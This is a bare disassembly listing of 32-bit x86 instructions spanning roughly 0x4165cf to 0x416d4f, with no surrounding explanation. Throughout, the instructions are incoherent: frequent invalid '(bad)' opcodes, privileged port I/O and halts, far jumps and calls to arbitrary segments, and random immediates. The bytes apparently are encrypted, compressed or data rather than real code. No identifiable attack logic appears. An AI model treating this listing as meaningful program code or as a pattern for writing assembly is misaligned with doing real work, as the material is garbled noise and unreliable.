  4165cf:	dec    edi
  4165d0:	add    ebp,DWORD PTR [ecx]
  4165d2:	jl     0x4165b5
  4165d4:	addr16 jmp 0xba87431
  4165da:	push   eax
  4165db:	(bad)  
  4165dc:	lock rcl DWORD PTR [eax+0x7a36bac2],0x1d
  4165e4:	add    DWORD PTR [edx+edx*1],edi
  4165e7:	data16 int3 
  4165e9:	les    eax,FWORD PTR [ebx+0x19ab9c15]
  4165ef:	sar    BYTE PTR [edi+0x1153e9bb],cl
  4165f5:	mov    ebp,0xde9a1126
  4165fa:	push   edx
  4165fb:	sub    al,BYTE PTR [ebp-0x50944447]
  416601:	aaa    
  416602:	dec    eax
  416603:	sub    BYTE PTR [edi],ah
  416605:	cld    
  416606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416607:	mov    WORD PTR [esi],cs
  416609:	nop
  41660a:	stc    
  41660b:	lahf   
  41660c:	add    eax,0x16c58343
  416611:	fbld   TBYTE PTR [ebx+ebp*8+0x6a]
  416615:	push   ss
  416616:	lds    esi,FWORD PTR [eax]
  416618:	psubq  mm5,QWORD PTR [eiz*4+0x6786c3a7]
  416620:	call   FWORD PTR [edx]
  416622:	aas    
  416623:	mov    ebp,0x75e6aeed
  416628:	xchg   ebp,eax
  416629:	in     al,0x3f
  41662b:	mov    edx,0x2aad3e1f
  416630:	adc    BYTE PTR [ebx],dl
  416632:	inc    eax
  416633:	fsubr  DWORD PTR ds:0xe06cba68
  416639:	cli    
  41663a:	push   cs
  41663b:	(bad)  
  41663c:	std    
  41663d:	iret   
  41663e:	sbb    eax,0x9fec0c5c
  416643:	(bad)  
  416644:	cmp    al,0xa1
  416646:	mov    esi,0xd6221aa
  41664b:	mov    edx,0x14965015
  416650:	fsub   DWORD PTR ds:0xba1a570e
  416656:	cmp    BYTE PTR [esi-0xa],dl
  416659:	arpl   WORD PTR [eax+ebp*4],bp
  41665c:	dec    eax
  41665d:	push   ds
  41665e:	mov    ch,BYTE PTR gs:[edx+edi*1-0x45842e18]
  416666:	retf   
  416667:	arpl   WORD PTR cs:[ebx],dx
  41666a:	addr16 cld 
  41666c:	rcr    cl,0x85
  41666f:	xor    esp,eax
  416671:	mov    eax,0xfd217126
  416676:	jg     0x416616
  416678:	ins    BYTE PTR es:[edi],dx
  416679:	pop    ebp
  41667a:	and    BYTE PTR [edx+0x54],0x55
  41667e:	popa   
  41667f:	ds ds fwait
  416682:	jecxz  0x416613
  416684:	lods   eax,DWORD PTR ds:[esi]
  416685:	mov    esi,0x7131bd83
  41668a:	inc    ebp
  41668b:	adc    ecx,DWORD PTR [edx+0x2b]
  41668e:	retf   0xb6af
  416691:	sbb    edx,edx
  416693:	and    DWORD PTR [ecx],ebp
  416695:	(bad)  [esi+ebx*8]
  416698:	mov    eax,0x901ec080
  41669d:	cli    
  41669e:	jbe    0x416703
  4166a0:	mov    esi,DWORD PTR [edx-0x70c69be6]
  4166a6:	mov    al,ds:0xa6d02593
  4166ab:	mov    eax,ds:0x4545277a
  4166b0:	pop    ds
  4166b1:	(bad)  
  4166b2:	adc    eax,0x12e05307
  4166b7:	(bad)  
  4166b8:	rcr    ebx,0x9d
  4166bb:	jne    0x4166b4
  4166bd:	mov    esp,0xbe7a958e
  4166c2:	or     BYTE PTR [esi+0x64],0xbc
  4166c6:	xor    edx,esp
  4166c8:	not    ecx
  4166ca:	loop   0x41666b
  4166cc:	sub    ebp,edi
  4166ce:	scas   al,BYTE PTR es:[edi]
  4166cf:	inc    eax
  4166d0:	clc    
  4166d1:	outs   dx,BYTE PTR ds:[esi]
  4166d2:	pop    ds
  4166d3:	(bad)  
  4166d4:	rcl    DWORD PTR [edi+0x76c41985],cl
  4166da:	jo     0x4166d7
  4166dc:	inc    esp
  4166dd:	arpl   WORD PTR [eax-0x3b9eb677],si
  4166e3:	xor    BYTE PTR [ebx-0x54df1396],ah
  4166e9:	and    BYTE PTR [ebx+0x32],ch
  4166ec:	into   
  4166ed:	push   cs
  4166ee:	mov    edx,0xfa0d2830
  4166f3:	cmp    al,0x23
  4166f5:	out    0xb6,eax
  4166f7:	and    ecx,DWORD PTR [edi+0x1]
  4166fa:	pusha  
  4166fb:	jmp    0xfe38:0x9b5678b1
  416702:	xchg   DWORD PTR [ebx-0x241ebb1],esp
  416708:	loopne 0x4166d0
  41670a:	jne    0x4166c9
  41670c:	jmp    0xedb1a9b9
  416711:	sbb    al,0x19
  416713:	dec    ecx
  416714:	ins    DWORD PTR es:[edi],dx
  416715:	pop    edx
  416716:	jge    0x4166b9
  416718:	enter  0x5fdb,0x1f
  41671c:	pop    ss
  41671d:	ins    BYTE PTR es:[edi],dx
  41671e:	shl    BYTE PTR [edi],cl
  416720:	adc    edx,DWORD PTR [edx]
  416722:	xchg   esi,eax
  416723:	mov    eax,0x49e0d08e
  416728:	mov    esp,0xd845013a
  41672d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41672e:	stos   DWORD PTR es:[edi],eax
  41672f:	jae    0x4166b1
  416731:	stc    
  416732:	ss shl dh,0x67
  416736:	fcmovnbe st,st(0)
  416738:	xchg   edx,eax
  416739:	loope  0x416751
  41673b:	sub    eax,0x940d8163
  416740:	(bad)  
  416741:	cmp    edi,DWORD PTR [ecx]
  416743:	pop    DWORD PTR ds:0xd0485363
  416749:	pop    edi
  41674a:	xor    BYTE PTR cs:[ebx-0x72],ch
  41674e:	or     BYTE PTR [eax+eax*1],bh
  416751:	pop    ecx
  416752:	(bad)  
  416753:	and    al,BYTE PTR [eax+0x19]
  416756:	nop
  416757:	xchg   DWORD PTR [edx-0x17],edi
  41675a:	and    eax,ebx
  41675c:	fstp   DWORD PTR [esi-0xc073b26]
  416762:	push   ebx
  416763:	push   0xffffffcb
  416765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416766:	pop    ds
  416767:	jb     0x41674b
  416769:	dec    edx
  41676a:	in     al,dx
  41676b:	cmp    al,0xe
  41676d:	inc    edi
  41676e:	inc    esp
  41676f:	sahf   
  416770:	pop    ds
  416771:	and    eax,0x106e7f39
  416776:	lods   al,BYTE PTR ds:[esi]
  416777:	inc    esi
  416778:	sub    BYTE PTR [ecx+0x1ab18ea1],al
  41677e:	int3   
  41677f:	jbe    0x4167b2
  416781:	inc    edx
  416782:	hlt    
  416783:	jno    0x416783
  416785:	(bad)  
  416786:	push   edx
  416787:	das    
  416788:	hlt    
  416789:	cdq    
  41678a:	(bad)  
  41678b:	in     al,0xbb
  41678d:	pusha  
  41678e:	scas   al,BYTE PTR es:[edi]
  41678f:	call   0x4cdb:0x364e4544
  416796:	imul   di,sp,0x1949
  41679b:	outs   dx,BYTE PTR ds:[esi]
  41679c:	imul   DWORD PTR [ebp-0x48]
  41679f:	sbb    al,0x5f
  4167a1:	mul    BYTE PTR [esi+esi*1+0x28]
  4167a5:	or     cl,BYTE PTR [ebp-0x61]
  4167a8:	sub    eax,0xd9c906aa
  4167ad:	ss pop edi
  4167af:	sbb    dh,BYTE PTR [edi+0x3d]
  4167b2:	loopne 0x416776
  4167b4:	mov    si,0xb4a
  4167b8:	lods   al,BYTE PTR ds:[esi]
  4167b9:	imul   esi,edx,0xffffffbc
  4167bc:	(bad)  
  4167bd:	cmp    DWORD PTR [ebp+edx*2+0x4d310601],eax
  4167c4:	les    eax,FWORD PTR [esi-0x8]
  4167c7:	or     esi,DWORD PTR [esi+0x92e5386]
  4167cd:	rcl    BYTE PTR [eax+0x64],1
  4167d0:	in     al,dx
  4167d1:	test   al,0xb
  4167d3:	xchg   dl,bh
  4167d5:	cmp    BYTE PTR [edx+edi*8-0x3eb27922],dl
  4167dc:	and    BYTE PTR [edi],ch
  4167de:	div    BYTE PTR ds:0x13689235
  4167e4:	cmc    
  4167e5:	arpl   WORD PTR [edx+0x3b],di
  4167e8:	es icebp 
  4167ea:	fsub   st,st(3)
  4167ec:	clc    
  4167ed:	test   bl,al
  4167ef:	adc    al,bl
  4167f1:	(bad)  
  4167f3:	lds    esi,FWORD PTR ds:0xd19f0825
  4167f9:	out    dx,eax
  4167fa:	xor    esp,esi
  4167fc:	push   ss
  4167fd:	cmp    al,0x27
  4167ff:	cmp    BYTE PTR [esi+eax*4+0x4f],bl
  416803:	xchg   ecx,eax
  416804:	test   cl,0xb2
  416807:	cmp    dl,ah
  416809:	sub    DWORD PTR [esi+0x47166626],0x9
  416810:	(bad)  
  416811:	cmc    
  416812:	or     ebp,DWORD PTR [edx+esi*4]
  416815:	in     al,0xc5
  416817:	fs adc eax,0x735c3fdc
  41681d:	push   edi
  41681e:	pop    ds
  41681f:	xor    ah,BYTE PTR [eax]
  416821:	repnz sub eax,0xb2316f26
  416827:	pushf  
  416828:	mov    dh,BYTE PTR [ebx+edi*2+0x3d]
  41682c:	ret    
  41682d:	hlt    
  41682e:	xchg   edx,eax
  41682f:	or     eax,0x73dbf4f5
  416834:	jbe    0x4167e8
  416836:	fcmovnb st,st(4)
  416838:	xchg   ecx,eax
  416839:	mov    dh,0x7
  41683b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41683c:	xchg   ebp,eax
  41683e:	mov    al,0x76
  416840:	push   0xffffffb8
  416842:	out    0xd,al
  416844:	out    dx,al
  416845:	ficom  WORD PTR ds:0x4e13c863
  41684b:	xchg   DWORD PTR [esi],edx
  41684d:	daa    
  41684e:	add    ah,BYTE PTR [edi+0x27]
  416851:	retf   0x88b0
  416854:	pop    ebp
  416855:	dec    ebp
  416856:	inc    esp
  416857:	sub    cl,ch
  416859:	leave  
  41685a:	jb     0x4168d6
  41685c:	in     al,dx
  41685d:	loop   0x416867
  41685f:	loope  0x41680a
  416861:	clc    
  416862:	sbb    eax,0xc17dc759
  416867:	sub    BYTE PTR [ebp-0x2c],dh
  41686a:	xchg   edi,eax
  41686b:	jecxz  0x4168ab
  41686d:	int3   
  41686e:	pop    esi
  41686f:	test   DWORD PTR [edi-0x18e436d9],ecx
  416875:	push   0x61f0fc95
  41687a:	jl     0x416845
  41687c:	or     DWORD PTR [esi],edx
  41687e:	pushf  
  41687f:	mov    ah,0xf0
  416881:	ja     0x41689a
  416883:	sbb    al,BYTE PTR [eax-0x17]
  416886:	ins    DWORD PTR es:[edi],dx
  416887:	mov    ah,0x84
  416889:	cmp    eax,0x2932182f
  41688e:	fsubr  QWORD PTR [esi+edi*8]
  416891:	or     al,0x67
  416893:	xchg   ebx,eax
  416894:	jle    0x4168c3
  416896:	lahf   
  416897:	rol    BYTE PTR [edx+0x1f],1
  41689a:	sub    dh,bl
  41689c:	shl    BYTE PTR [esp+edx*2-0x30],0x2
  4168a1:	inc    ebp
  4168a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168a3:	xor    ebx,0x25
  4168a6:	push   0x603d4646
  4168ab:	test   al,0x59
  4168ad:	pop    esp
  4168ae:	sub    ebx,DWORD PTR [ecx+0x7f]
  4168b1:	sbb    bh,BYTE PTR ds:0xb51820a6
  4168b7:	daa    
  4168b8:	das    
  4168b9:	inc    edi
  4168ba:	and    bl,BYTE PTR [esp+edi*1-0x48826d2f]
  4168c1:	arpl   WORD PTR [eax+0x3675e762],bp
  4168c7:	test   cl,dh
  4168c9:	mov    al,BYTE PTR [ebx]
  4168cb:	and    edx,DWORD PTR [ebx]
  4168cd:	scas   al,BYTE PTR es:[edi]
  4168ce:	test   al,0xae
  4168d0:	retf   0x69be
  4168d3:	cmp    bl,bh
  4168d5:	dec    ebx
  4168d6:	test   dh,0x6d
  4168d9:	and    bl,BYTE PTR [ebp+0x695edbd5]
  4168df:	jnp    0x416943
  4168e1:	and    al,0xa4
  4168e3:	adc    ebp,ecx
  4168e5:	pop    eax
  4168e6:	xchg   edi,eax
  4168e7:	cdq    
  4168e8:	fwait
  4168e9:	and    al,0xe7
  4168eb:	test   al,0x8d
  4168ed:	mov    dh,0x51
  4168ef:	inc    ebp
  4168f0:	ins    BYTE PTR es:[edi],dx
  4168f1:	lods   eax,DWORD PTR ds:[esi]
  4168f2:	cmp    edi,DWORD PTR [ebp-0x4a98ecfd]
  4168f8:	sbb    BYTE PTR [ebx],dl
  4168fa:	ins    BYTE PTR es:[edi],dx
  4168fb:	dec    ebx
  4168fc:	sub    DWORD PTR [ebx+0x41ddc9e0],ebp
  416902:	cmp    al,0x15
  416904:	les    edx,FWORD PTR [edx]
  416906:	outs   dx,BYTE PTR ds:[esi]
  416907:	xchg   edi,eax
  416908:	jge    0x4168a7
  41690a:	pop    esi
  41690b:	jbe    0x4168d0
  41690d:	add    al,cl
  41690f:	mov    bl,0xbb
  416911:	clc    
  416912:	lock lods al,BYTE PTR ds:[esi]
  416914:	test   eax,0xbce861a7
  416919:	sub    eax,0x235f2c46
  41691e:	icebp  
  41691f:	fiadd  DWORD PTR [edx]
  416921:	jne    0x41691a
  416923:	fisub  WORD PTR [ebx]
  416925:	loopne 0x41698d
  416927:	mov    dh,0x6
  416929:	adc    DWORD PTR [esi-0x62],0x3433e7b8
  416930:	ins    DWORD PTR es:[edi],dx
  416931:	cs cmp al,0xdb
  416934:	xchg   ebp,eax
  416935:	or     eax,0x2956b9bd
  41693a:	cs cmp eax,esp
  41693d:	xor    al,0x86
  41693f:	ret    
  416940:	icebp  
  416941:	xor    al,0xa5
  416943:	not    BYTE PTR [ebx]
  416945:	jp     0x416993
  416947:	outs   dx,BYTE PTR ds:[esi]
  416948:	cmp    eax,DWORD PTR [eax+0x4c]
  41694b:	cld    
  41694c:	jns    0x4168ef
  41694e:	dec    eax
  41694f:	push   cs
  416950:	dec    ebp
  416951:	adc    al,0xae
  416953:	lods   al,BYTE PTR ds:[esi]
  416954:	cli    
  416955:	daa    
  416956:	push   ds
  416957:	sbb    edi,DWORD PTR [ebp-0x33]
  41695a:	or     al,0xaf
  41695c:	adc    al,0xd
  41695e:	add    cl,BYTE PTR [ebp+0x3bcf8765]
  416964:	jl     0x41692b
  416966:	fdivr  DWORD PTR [ebp+0x36]
  416969:	call   0xabdc:0x9949916c
  416970:	(bad)  
  416971:	popf   
  416972:	cmp    BYTE PTR [edx+0x79],0x1f
  416976:	mov    bl,0x47
  416978:	sahf   
  416979:	jmp    0xf9623e24
  41697e:	(bad)  
  41697f:	adc    ch,dh
  416981:	std    
  416982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416983:	out    dx,eax
  416984:	(bad)  
  416985:	dec    ch
  416987:	in     eax,dx
  416988:	hlt    
  416989:	push   edi
  41698a:	mov    edi,0x62372446
  41698f:	ins    BYTE PTR es:[edi],dx
  416990:	sub    edx,DWORD PTR ds:0x273974fb
  416996:	stos   DWORD PTR es:[edi],eax
  416997:	sbb    al,0x7c
  416999:	xchg   edi,eax
  41699a:	adc    al,0xa5
  41699c:	adc    ebx,esp
  41699e:	or     DWORD PTR [edx-0x6c],esp
  4169a1:	dec    eax
  4169a2:	xchg   edx,eax
  4169a3:	mov    cl,0x85
  4169a5:	push   esi
  4169a6:	ds jne 0x41696d
  4169a9:	iret   
  4169aa:	mov    ?,WORD PTR [ebp+0x5a41eebe]
  4169b0:	arpl   WORD PTR [esi],sp
  4169b2:	pop    edx
  4169b3:	cld    
  4169b4:	aaa    
  4169b5:	aad    0x33
  4169b7:	xchg   ebx,eax
  4169b8:	outs   dx,BYTE PTR ds:[esi]
  4169b9:	(bad)  
  4169ba:	pop    es
  4169bb:	and    eax,DWORD PTR [esi-0x70]
  4169be:	cmp    eax,0xd089f29
  4169c3:	loopne 0x416970
  4169c5:	mov    DWORD PTR [ebx-0x52],ebp
  4169c8:	mov    ds:0x60945b24,al
  4169cd:	xlat   BYTE PTR ds:[ebx]
  4169ce:	dec    ebx
  4169cf:	jge    0x4169db
  4169d1:	inc    esp
  4169d3:	(bad)  
  4169d4:	ret    0xc3f2
  4169d7:	in     eax,0x6a
  4169d9:	fwait
  4169da:	add    bl,BYTE PTR [ecx-0x23]
  4169dd:	jae    0x4169f8
  4169df:	mov    ebx,0xf0a2fdc5
  4169e4:	jmp    0x4fd7:0x238e2d6f
  4169eb:	test   dl,0x23
  4169ee:	shl    BYTE PTR [ebx],cl
  4169f0:	mov    eax,ds:0xa80c3ab6
  4169f5:	pop    ss
  4169f6:	out    0x1a,eax
  4169f8:	ja     0x4169ba
  4169fa:	mov    ah,0xac
  4169fc:	je     0x416a4e
  4169fe:	pop    esp
  4169ff:	out    dx,eax
  416a00:	pop    esi
  416a01:	test   eax,0x3ed418bf
  416a06:	jo     0x416a67
  416a08:	cmp    al,0x61
  416a0a:	popf   
  416a0b:	inc    ebp
  416a0c:	cmp    BYTE PTR [edi],ah
  416a0e:	push   eax
  416a0f:	faddp  st(6),st
  416a11:	sub    al,0x2
  416a13:	jnp    0x416a81
  416a15:	xchg   DWORD PTR [ecx-0x65],edx
  416a18:	adc    al,0x84
  416a1a:	sahf   
  416a1b:	bound  eax,QWORD PTR [ebx-0x65f1e88b]
  416a21:	fnstcw WORD PTR [eax]
  416a23:	and    edx,DWORD PTR [ebp-0x9]
  416a26:	push   esi
  416a27:	xor    DWORD PTR [esi+0x2bb632c2],ecx
  416a2d:	fsubr  DWORD PTR [esi+0x3b12b8c3]
  416a33:	mov    edi,0x220a9b02
  416a38:	aas    
  416a39:	mov    ds:0x17a27b85,eax
  416a3e:	punpcklbw mm0,mm1
  416a41:	retf   0xc255
  416a44:	scas   eax,DWORD PTR es:[edi]
  416a45:	in     al,0x55
  416a47:	stos   BYTE PTR es:[edi],al
  416a48:	call   0xfa3ded13
  416a4d:	pop    edx
  416a4e:	enter  0x93c9,0xc
  416a52:	pop    ebx
  416a53:	mov    esi,0x3542e3e4
  416a58:	mov    ds:0xfc2b8399,al
  416a5d:	push   edx
  416a5e:	sub    BYTE PTR ds:0xb0926654,dh
  416a64:	fmul   DWORD PTR [ebp+0xe]
  416a67:	and    BYTE PTR [ebx],cl
  416a69:	sbb    al,0x69
  416a6b:	mov    esp,0x18cd140f
  416a70:	sub    al,0x1f
  416a72:	adc    al,0x20
  416a74:	cmp    esi,DWORD PTR [esi]
  416a76:	fucomip st,st(6)
  416a78:	test   al,0x64
  416a7a:	js     0x416aae
  416a7c:	adc    ch,ch
  416a7e:	(bad)  
  416a7f:	xchg   ebp,eax
  416a80:	jno    0x416ac8
  416a82:	bound  edi,QWORD PTR [edi-0x59]
  416a85:	(bad)  
  416a86:	and    esp,DWORD PTR [esi+0x2a]
  416a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a8a:	inc    edx
  416a8b:	jmp    0x416a40
  416a8d:	imul   edi,DWORD PTR [edi+edi*4+0x48036ccd],0x50b8abfa
  416a98:	cdq    
  416a99:	add    al,0xea
  416a9b:	sbb    DWORD PTR gs:[edi],0x2d
  416a9f:	repz gs xchg ebp,eax
  416aa2:	dec    ebx
  416aa3:	or     eax,0xabe43f04
  416aa8:	push   edx
  416aa9:	mov    ds:0x86df2f84,eax
  416aae:	inc    ebx
  416aaf:	ret    
  416ab0:	aas    
  416ab1:	xchg   edx,eax
  416ab3:	lods   al,BYTE PTR ds:[esi]
  416ab4:	arpl   WORD PTR [ecx+esi*4],si
  416ab7:	loopne 0x416b30
  416ab9:	in     al,0x86
  416abb:	xchg   esp,eax
  416abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416abd:	add    BYTE PTR [ebx-0x67],ch
  416ac0:	push   edx
  416ac1:	push   ecx
  416ac2:	test   eax,0x250e7c39
  416ac7:	int    0x11
  416ac9:	lock mov bl,0x6a
  416acc:	ins    DWORD PTR es:[edi],dx
  416acd:	adc    BYTE PTR [ecx],al
  416acf:	out    dx,al
  416ad0:	push   ss
  416ad1:	stos   DWORD PTR es:[edi],eax
  416ad2:	dec    ebp
  416ad3:	sbb    BYTE PTR [eax],0x68
  416ad6:	dec    ebp
  416ad7:	mov    esp,0x10c9c308
  416adc:	sub    ebx,ebx
  416ade:	mov    esp,0xf7acbf11
  416ae3:	outs   dx,BYTE PTR ds:[esi]
  416ae4:	lods   eax,DWORD PTR ds:[esi]
  416ae5:	ds aam 0xa5
  416ae8:	rcr    dh,0xc9
  416aeb:	pop    ds
  416aec:	cmc    
  416aed:	dec    DWORD PTR [eax]
  416aef:	pop    ebx
  416af0:	(bad)  
  416af1:	add    edx,DWORD PTR [ebp-0x6aef6d2e]
  416af7:	int    0xe2
  416af9:	mov    edx,0x14ffb30e
  416afe:	lods   eax,DWORD PTR ds:[esi]
  416aff:	loop   0x416aa1
  416b01:	sub    al,0x73
  416b03:	jae    0x416b06
  416b05:	jge    0x416ada
  416b07:	test   BYTE PTR [eax-0x2c],ch
  416b0a:	mov    ecx,0x94c77adf
  416b0f:	cmp    ebp,eax
  416b11:	ret    
  416b12:	push   ebp
  416b13:	into   
  416b14:	aas    
  416b15:	jnp    0x416b4f
  416b17:	push   0x24
  416b19:	pop    esp
  416b1a:	shr    DWORD PTR [ebx-0x2a],1
  416b1d:	lock out dx,al
  416b1f:	iret   
  416b20:	in     eax,0xd1
  416b22:	(bad)  
  416b23:	fisub  WORD PTR [edi+0x7d7a1523]
  416b29:	add    al,0x4a
  416b2b:	fs cmp eax,0x345d35a8
  416b31:	jbe    0x416ba6
  416b33:	push   ss
  416b34:	fisttp WORD PTR [esp+ecx*8+0x764d3dd9]
  416b3b:	test   BYTE PTR [eax-0x1518941],ch
  416b41:	loope  0x416b0e
  416b43:	cmp    BYTE PTR [esi-0x3c],dl
  416b46:	inc    edx
  416b47:	imul   ebx,edx,0xffffff94
  416b4a:	test   ecx,ebx
  416b4c:	xor    eax,DWORD PTR [esi+0x1b]
  416b4f:	test   eax,0xabbe884
  416b54:	shl    DWORD PTR [ebx],0x2d
  416b57:	jne    0x416bb3
  416b59:	push   es
  416b5a:	and    BYTE PTR [edi+0x27c57618],0x5f
  416b61:	dec    ecx
  416b62:	rol    DWORD PTR [eax],1
  416b64:	or     ch,BYTE PTR [ebx+eiz*4]
  416b67:	repnz cmc 
  416b69:	xchg   ebp,eax
  416b6a:	push   0x4dcb279a
  416b6f:	adc    eax,0xa5d11351
  416b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b75:	nop
  416b76:	leave  
  416b77:	jae    0x416baa
  416b79:	retf   
  416b7a:	mov    ch,0x8d
  416b7c:	ret    0x3b75
  416b7f:	out    dx,al
  416b80:	push   edx
  416b81:	pop    ebp
  416b82:	pop    edx
  416b83:	sub    eax,0xec1270b4
  416b88:	mov    esp,0x3e4151cc
  416b8d:	aaa    
  416b8e:	pop    ss
  416b8f:	pop    edi
  416b90:	jle    0x416b1c
  416b92:	int3   
  416b93:	xor    al,0x1f
  416b95:	sbb    eax,0x2e90a4e1
  416b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b9b:	mov    ebx,0x164ffc23
  416ba0:	and    al,0x55
  416ba2:	mov    ebx,DWORD PTR [ebx-0x3dd7424c]
  416ba8:	add    al,0x3a
  416baa:	cli    
  416bab:	(bad)  
  416bac:	fcmove st,st(0)
  416bae:	push   ds
  416baf:	inc    ebx
  416bb0:	inc    ecx
  416bb1:	pop    edx
  416bb2:	jle    0x416bd3
  416bb4:	and    eax,0x82a93a92
  416bb9:	aam    0xf3
  416bbb:	adc    BYTE PTR [edi-0x69d3d17b],ch
  416bc1:	mov    eax,ds:0x4b12cdc3
  416bc6:	mov    cl,0xbf
  416bc8:	xor    dl,BYTE PTR ds:0x404e7a04
  416bce:	pop    ebx
  416bcf:	xchg   ebx,eax
  416bd0:	outs   dx,DWORD PTR ds:[esi]
  416bd1:	jge    0x416c27
  416bd3:	dec    edx
  416bd5:	aas    
  416bd6:	adc    al,0x25
  416bd8:	loope  0x416c08
  416bda:	or     al,0x96
  416bdc:	mov    dh,0x85
  416bde:	mov    ah,0x20
  416be0:	ins    DWORD PTR es:[edi],dx
  416be1:	arpl   WORD PTR [ebx-0x8],dx
  416be4:	(bad)  
  416be5:	repnz in eax,0x94
  416be8:	sahf   
  416be9:	ja     0x416ba0
  416beb:	mov    eax,ds:0x3738da8e
  416bf0:	sbb    al,BYTE PTR [ecx+0xc]
  416bf3:	cmp    BYTE PTR [ebx+ecx*4],ah
  416bf6:	sahf   
  416bf7:	in     eax,0xa6
  416bf9:	or     BYTE PTR [esi+0x4d008b2b],0x42
  416c00:	add    al,0x89
  416c02:	in     al,0xf6
  416c04:	cmp    dh,BYTE PTR [ebp-0x3b]
  416c07:	inc    ecx
  416c08:	pop    esp
  416c09:	push   cs
  416c0a:	jge    0x416c6d
  416c0c:	or     dh,ah
  416c0e:	call   0xede2b216
  416c13:	jb     0x416c3f
  416c15:	test   ah,dh
  416c17:	bound  ebp,QWORD PTR [esi]
  416c19:	sub    BYTE PTR [edi+edx*1],al
  416c1c:	push   ecx
  416c1d:	jle    0x416c1f
  416c1f:	jns    0x416c12
  416c21:	mov    eax,ds:0x6859aa47
  416c26:	push   ebp
  416c27:	pusha  
  416c28:	out    dx,eax
  416c29:	and    DWORD PTR [ebx],eax
  416c2b:	lock pop ebp
  416c2d:	fisub  DWORD PTR [edx+0xa]
  416c30:	fucomi st,st(6)
  416c32:	call   0xfc51:0x249c1f12
  416c39:	dec    esp
  416c3a:	std    
  416c3b:	jmp    0x416bc3
  416c3d:	retf   
  416c3e:	std    
  416c3f:	inc    edi
  416c40:	ja     0x416bf7
  416c42:	je     0x416c46
  416c44:	mov    ebx,0x42d76d6c
  416c49:	les    ecx,FWORD PTR [edx-0x9570a53]
  416c4f:	(bad)  
  416c50:	push   ss
  416c51:	pop    ecx
  416c52:	cwde   
  416c53:	xchg   edx,eax
  416c54:	outs   dx,DWORD PTR ds:[esi]
  416c55:	pop    ebp
  416c56:	fs xchg esi,eax
  416c58:	fnsave [esi]
  416c5a:	add    DWORD PTR [ecx],esp
  416c5c:	stc    
  416c5d:	sub    ebp,DWORD PTR [edi]
  416c5f:	leave  
  416c60:	dec    eax
  416c61:	pop    esi
  416c62:	into   
  416c63:	inc    edi
  416c64:	cmp    DWORD PTR [esi-0x76f2cdac],0x85eb9a7c
  416c6e:	rol    ah,1
  416c70:	jbe    0x416c69
  416c72:	or     esi,DWORD PTR [edi+0x11]
  416c75:	repnz xchg edx,eax
  416c77:	cwde   
  416c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c79:	jne    0x416c90
  416c7b:	sar    ecx,1
  416c7d:	adc    BYTE PTR [ecx+esi*2],0x3f
  416c81:	sbb    DWORD PTR [ebx-0x68797156],ecx
  416c87:	repz and eax,0x215df5f0
  416c8d:	cli    
  416c8e:	icebp  
  416c8f:	mov    BYTE PTR [edi+0x39],dl
  416c92:	or     bh,0x4e
  416c95:	cwde   
  416c96:	(bad)  
  416c97:	dec    ebp
  416c98:	dec    ebp
  416c99:	out    0x42,al
  416c9b:	add    al,0x8d
  416c9d:	test   al,0x79
  416c9f:	out    dx,al
  416ca0:	inc    eax
  416ca1:	mov    ch,0x7f
  416ca3:	inc    edi
  416ca4:	scas   al,BYTE PTR es:[edi]
  416ca5:	mov    ah,0x10
  416ca7:	aas    
  416ca8:	clc    
  416ca9:	nop
  416caa:	mov    ah,0x1e
  416cac:	iret   
  416cad:	mov    ?,WORD PTR [esi+0x2ac78c81]
  416cb3:	stos   DWORD PTR es:[edi],eax
  416cb4:	cmp    al,0xef
  416cb6:	dec    esi
  416cb7:	jnp    0x416cba
  416cb9:	mov    bl,ch
  416cbb:	xchg   DWORD PTR [eax-0x1c],ebx
  416cbe:	add    eax,0xf757377b
  416cc3:	adc    bh,dh
  416cc5:	push   esi
  416cc6:	add    BYTE PTR [eax-0xc],al
  416cc9:	adc    eax,0x91e40565
  416cce:	out    0xa2,al
  416cd0:	enter  0x7b19,0x43
  416cd4:	inc    esp
  416cd5:	sar    ah,1
  416cd7:	sbb    al,0x54
  416cd9:	or     al,0x7e
  416cdb:	lods   al,BYTE PTR ds:[esi]
  416cdc:	aad    0x9b
  416cde:	jo     0x416c67
  416ce0:	jle    0x416d00
  416ce2:	sbb    DWORD PTR [edx-0x4e],0xffffffca
  416ce6:	out    dx,eax
  416ce7:	xchg   edx,eax
  416ce8:	push   ss
  416ce9:	add    eax,0x4787157e
  416cee:	jnp    0x416cc6
  416cf0:	or     DWORD PTR [esi+edi*1+0x2],ecx
  416cf4:	xor    DWORD PTR [edi+ebp*4],ebx
  416cf7:	xchg   DWORD PTR [edi],esp
  416cf9:	cli    
  416cfa:	push   ds
  416cfb:	data16 sub al,0x37
  416cfe:	fcomp  DWORD PTR [edx+0x72]
  416d01:	inc    eax
  416d02:	outs   dx,BYTE PTR ds:[esi]
  416d03:	stos   DWORD PTR es:[edi],eax
  416d04:	cmp    al,al
  416d06:	xor    bh,bh
  416d08:	mov    BYTE PTR [eax-0x72],bl
  416d0b:	jmp    DWORD PTR [edi-0x3d]
  416d0e:	icebp  
  416d0f:	sub    BYTE PTR [ecx],cl
  416d11:	pop    edx
  416d12:	or     BYTE PTR ds:0xdbda461,bl
  416d18:	pop    ss
  416d19:	pop    es
  416d1a:	inc    ecx
  416d1b:	mov    ebp,0x94844148
  416d20:	aas    
  416d21:	xor    DWORD PTR [edi],esi
  416d23:	adc    BYTE PTR [esi+0x723499c4],cl
  416d29:	jns    0x416d44
  416d2b:	gs sbb eax,0xc1486f71
  416d31:	xchg   esp,eax
  416d32:	jns    0x416ce3
  416d34:	(bad)  
  416d35:	sbb    eax,0xd649a1b2
  416d3a:	jmp    0x416d91
  416d3c:	in     al,dx
  416d3d:	ja     0x416ceb
  416d3f:	jp     0x416d08
  416d41:	in     eax,0x71
  416d43:	sar    dh,0xc
  416d46:	inc    eax
  416d47:	aas    
  416d48:	shl    DWORD PTR [ebp-0x729eaad8],0xb5
  416d4f:	aaa    
